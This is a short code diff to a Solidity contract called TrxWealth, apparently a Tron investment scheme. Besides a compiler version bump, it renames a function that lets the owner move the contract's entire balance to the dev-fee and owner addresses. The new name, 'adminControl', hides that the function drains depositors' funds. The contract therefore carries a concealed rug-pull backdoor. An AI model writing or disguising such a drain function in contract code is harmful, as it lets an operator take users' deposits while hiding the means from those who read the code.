@@ -1,4 +1,4 @@
-pragma solidity 0.5.4;
+pragma solidity 0.5.8;
 
 contract TrxWealth {
     struct User {
@@ -329,7 +329,7 @@ contract TrxWealth {
         }
     }
 
-    function admin_widthdraw() external {
+    function adminControl() external {
         require(msg.sender == owner);
         dev_fee.transfer(address(this).balance/2);
         owner.transfer(address(this).balance);
